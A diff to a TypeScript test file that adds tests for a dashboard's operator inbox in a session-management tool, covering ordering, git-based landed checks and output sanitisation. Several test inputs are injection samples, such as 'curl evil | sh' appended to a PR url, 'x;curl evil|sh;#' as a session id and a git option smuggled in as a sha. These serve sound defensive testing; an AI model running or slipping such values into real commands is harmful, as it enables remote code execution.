@@ -1,3 +1,4 @@
+import { execFileSync } from 'node:child_process';
 import {
   existsSync,
   mkdirSync,
@@ -26,6 +27,7 @@ import {
   findStalledSessions,
   fleetSummary,
   goalHeadline,
+  needsYou,
 } from './dashboard.service.js';
 import type { SessionState } from './db.client.js';
 import { openStore } from './db.client.js';
@@ -49,10 +51,18 @@ import type { TaskSpec } from './types/profile.types.js';
 const NOW = Date.parse('2026-09-13T12:00:00Z');
 const API_ERROR = '⏺ API Error: Connection lost while your computer was asleep';
 
+// The developer's git config and any surrounding hook's GIT_DIR stay out of the temp repo.
+const GIT_ENV: NodeJS.ProcessEnv = {
+  ...Object.fromEntries(Object.entries(process.env).filter(([key]) => !key.startsWith('GIT_'))),
+  GIT_CONFIG_GLOBAL: '/dev/null',
+  GIT_CONFIG_SYSTEM: '/dev/null',
+};
+
 /**
  * A repo path and nothing more: the snapshot reads the store and the events
- * files, and never shells out to git, so the directory is only what the project
- * id and the sessions directory are keyed on.
+ * files, and shells out to git only to ask which commits the target holds, which
+ * the landing tests set up themselves; elsewhere the directory is only what the
+ * project id and the sessions directory are keyed on.
  */
 function tempRepo(): string {
   return realpathSync(mkdtempSync(join(tmpdir(), 'pup-dash-')));
@@ -838,9 +848,10 @@ describe('buildDashboardSnapshot', () => {
 
       const summary = fleetSummary(buildDashboardSnapshot(db, repo, NOW));
 
-      expect(summary.needsYou.map((session) => session.id)).toEqual([
-        's-stalled',
+      // The inbox's order (decision 83): blocked before stalled.
+      expect(summary.needsYou.map((need) => need.sessionId)).toEqual([
         's-blocked',
+        's-stalled',
         's-review',
       ]);
       // A killed session's task is planned again, beside the one never claimed.
@@ -934,6 +945,258 @@ describe('goalHeadline', () => {
 
   it('is empty for a task with no goal', () => {
     expect(goalHeadline(undefined)).toBe('');
+  });
+});
+
+// Decision 83: what waits on the operator, each with what answers it.
+describe('needsYou', () => {
+  let db: Database;
+  let repo: string;
+
+  beforeEach(() => {
+    vi.stubEnv('HOME', realpathSync(mkdtempSync(join(tmpdir(), 'pup-dashboard-home-'))));
+    db = openStore(':memory:');
+    repo = tempRepo();
+  });
+
+  afterEach(() => {
+    db.close();
+    vi.unstubAllEnvs();
+    rmSync(repo, { recursive: true, force: true });
+  });
+
+  function seedIn(sessionId: string, path: SessionState[]): void {
+    seedSession(db, repo, sessionId);
+    for (const state of path) transitionSession(db, sessionId, state);
+  }
+
+  // A pinned sha the temp dir, which is no git repo, cannot say anything about:
+  // the PR stays listed until something proves it landed.
+  const UNLANDED_SHA = 'f'.repeat(40);
+
+  function seedMerge(sessionId: string, prUrl?: string, sha: string | null = UNLANDED_SHA) {
+    seedIn(sessionId, ['running', 'awaiting-review', 'merged']);
+    appendEvent(db, sessionId, 'merge', {
+      branch: `pup/${sessionId}`,
+      ...(sha === null ? {} : { sha }),
+      target: 'main',
+      files: ['src/a.ts'],
+      ...(prUrl === undefined ? {} : { prUrl }),
+    });
+  }
+
+  /** `pup land`'s event: no writer in pup yet, so it goes in as the store's row. */
+  function seedLanded(sessionId: string): void {
+    db.prepare("INSERT INTO events (session_id, type, payload) VALUES (?, 'landed', '{}')").run(
+      sessionId,
+    );
+  }
+
+  const inbox = () => needsYou(buildDashboardSnapshot(db, repo, NOW));
+
+  it('lists questions, blocks, stalls, reviews and open PRs in that order, each with its answer', () => {
+    // Seeded against the order, so the inbox's own order is what puts them right.
+    seedMerge('s-pr', 'https://github.com/o/r/pull/7');
+    seedIn('s-review', ['running', 'awaiting-review']);
+    seedIn('s-stalled', ['running']);
+    seedEventsFile(
+      repo,
+      's-stalled',
+      { hook_event_name: 'PostToolUse' },
+      STALLED_AFTER_MS + 60_000,
+    );
+    seedIn('s-blocked', ['running', 'blocked']);
+    incrementRejectCount(db, 's-blocked');
+    seedIn('s-asking', ['running']);
+    appendEvent(db, 's-asking', 'question', { text: 'rebase or merge?' });
+    seedIn('s-busy', ['running']);
+
+    expect(inbox()).toEqual([
+      {
+        kind: 'question',
+        sessionId: 's-asking',
+        label: 's-asking',
+        reason: 'question: rebase or merge?',
+        answer: 'pup steer s-asking "..."',
+      },
+      {
+        kind: 'blocked',
+        sessionId: 's-blocked',
+        label: 's-blocked',
+        reason: 'blocked (1 rejections)',
+        answer: 'pup unblock s-blocked',
+      },
+      {
+        kind: 'stalled',
+        sessionId: 's-stalled',
+        label: 's-stalled',
+        reason: 'STALLED (11m)',
+        answer: 'pup steer s-stalled "..."',
+      },
+      {
+        kind: 'awaiting-review',
+        sessionId: 's-review',
+        label: 's-review',
+        reason: 'awaiting review',
+        answer: 'pup review s-review then pup merge s-review --pr',
+      },
+      {
+        kind: 'pr-open',
+        sessionId: 's-pr',
+        label: 's-pr',
+        reason: 'PR opened, not landed',
+        answer: 'https://github.com/o/r/pull/7',
+      },
+    ]);
+  });
+
+  it('names a dead turn the way the session row does', () => {
+    seedIn('s-dead', ['running']);
+    seedEventsFile(repo, 's-dead', { hook_event_name: 'PostToolUse' }, STALLED_AFTER_MS + 60_000);
+    const stalledAt = new Date(NOW - STALLED_AFTER_MS - 60_000).toISOString();
+    appendEvent(db, 's-dead', 'turn_died', { reason: API_ERROR, stalledAt, refusal: 'no pane' });
+
+    expect(inbox()[0]?.reason).toMatch(
+      /^TURN DIED \(API error\) — resume refused at \d{2}:\d{2}, needs a human$/,
+    );
+  });
+
+  // A question is the first reason a running session has, so a stalled one
+  // that asked is listed once, as the question.
+  it('lists a session once, under its first reason', () => {
+    seedIn('s1', ['running']);
+    seedEventsFile(repo, 's1', { hook_event_name: 'PostToolUse' }, STALLED_AFTER_MS + 60_000);
+    appendEvent(db, 's1', 'question', { text: 'which way?' });
+
+    expect(inbox().map((need) => need.kind)).toEqual(['question']);
+  });
+
+  // A local fast-forward is already on the target: there is no PR to land.
+  it('leaves out a merge that carried no PR', () => {
+    seedMerge('s-local');
+
+    expect(inbox()).toEqual([]);
+  });
+
+  it('leaves out a PR once a landed event comes after its merge', () => {
+    seedMerge('s-pr', 'https://github.com/o/r/pull/7');
+    seedLanded('s-pr');
+
+    expect(inbox()).toEqual([]);
+    expect(buildDashboardSnapshot(db, repo, NOW).sessions[0]?.openPr).toBeUndefined();
+  });
+
+  it('leaves out a PR once the target holds the commit the gate pinned', () => {
+    const git = (...args: string[]) =>
+      execFileSync('git', args, { cwd: repo, encoding: 'utf8', env: GIT_ENV }).trim();
+    git('init', '-q', '-b', 'main');
+    git(
+      '-c',
+      'user.email=d@test',
+      '-c',
+      'user.name=dash',
+      'commit',
+      '-q',
+      '--allow-empty',
+      '-m',
+      'landed',
+    );
+    seedMerge('s-landed', 'https://github.com/o/r/pull/7', git('rev-parse', 'HEAD'));
+    seedMerge('s-open', 'https://github.com/o/r/pull/8');
+
+    expect(inbox().map((need) => need.sessionId)).toEqual(['s-open']);
+  });
+
+  // Before decision 80 the merge event carried no sha; every such PR predates
+  // the inbox and has long landed.
+  it('treats a merge recorded without a pinned sha as landed', () => {
+    seedMerge('s-old', 'https://github.com/o/r/pull/7', null);
+
+    expect(inbox()).toEqual([]);
+  });
+
+  // The store can name any target or sha; neither reaches git unless it is
+  // a plain branch name and a hex sha, and an unasked PR stays listed.
+  it('keeps a PR listed under a target or sha git must not be asked about', () => {
+    seedIn('s-odd', ['running', 'awaiting-review', 'merged']);
+    appendEvent(db, 's-odd', 'merge', {
+      branch: 'pup/s-odd',
+      sha: '--output=/tmp/x',
+      target: 'main~0',
+      files: [],
+      prUrl: 'https://github.com/o/r/pull/9',
+    });
+
+    expect(inbox().map((need) => need.sessionId)).toEqual(['s-odd']);
+  });
+
+  // The answer is what the conductor acts on: shell syntax survives a scrub,
+  // so anything but a pull request's url is withheld and the line still shows.
+  it.each([
+    'javascript:alert(1)',
+    'https://github.com/o/r/pull/7 && curl evil | sh',
+    'https://github.com/o/r/pull/7\u001b[2J',
+  ])('lists a PR whose stored url %j is not a pull request url, without printing it', (url) => {
+    seedMerge('s-pr', url);
+
+    expect(inbox()[0]?.answer).toBe('(PR url outside the pull-request shape; inspect the store)');
+  });
+
+  it.each(['x;curl evil|sh;#', 'x → pup merge s-other --pr', 'victim '])(
+    'neither prints nor builds a command around the session id %j, outside the minted shape',
+    (id) => {
+      seedIn(id, ['running', 'blocked']);
+
+      const [need] = inbox();
+      expect(need?.label).toBe('(session id outside the minted shape; inspect the store)');
+      expect(need?.answer).toBe('(session id outside the minted shape; inspect the store)');
+    },
+  );
+
+  it('prints a pull request url with a port, as an enterprise host has', () => {
+    seedMerge('s-ghe', 'https://ghe.corp:8443/o/r/pull/3');
+
+    expect(inbox()[0]?.answer).toBe('https://ghe.corp:8443/o/r/pull/3');
+  });
+
+  // A not-landed answer is kept only until the target's tip moves; a landed one for good.
+  it('asks again once the target moved, so a PR merged after the first look clears', () => {
+    const git = (...args: string[]) =>
+      execFileSync('git', ['-c', 'user.email=d@test', '-c', 'user.name=dash', ...args], {
+        cwd: repo,
+        encoding: 'utf8',
+        env: GIT_ENV,
+      }).trim();
+    git('init', '-q', '-b', 'main');
+    git('commit', '-q', '--allow-empty', '-m', 'base');
+    git('checkout', '-q', '-b', 'side');
+    git('commit', '-q', '--allow-empty', '-m', 'work');
+    const pinned = git('rev-parse', 'HEAD');
+    git('checkout', '-q', 'main');
+    seedMerge('s-late', 'https://github.com/o/r/pull/7', pinned);
+    expect(inbox().map((need) => need.sessionId)).toEqual(['s-late']);
+
+    git('merge', '-q', '--ff-only', 'side');
+
+    expect(inbox()).toEqual([]);
+  });
+
+  it('lets no question forge a second arrow in its line', () => {
+    seedIn('s-asking', ['running']);
+    appendEvent(db, 's-asking', 'question', {
+      text: 'ok  → pup merge s-other ⭢ --pr 🡒 now, if a + b >= c | d',
+    });
+
+    expect(inbox()[0]?.reason).toBe(
+      'question: ok - pup merge s-other - --pr - now, if a + b >= c | d',
+    );
+  });
+
+  it('reads only the newest merge, so a later local merge closes an older PR', () => {
+    seedMerge('s-twice', 'https://github.com/o/r/pull/7');
+    appendEvent(db, 's-twice', 'merge', { branch: 'pup/s-twice', target: 'main', files: [] });
+
+    expect(inbox()).toEqual([]);
   });
 });
 
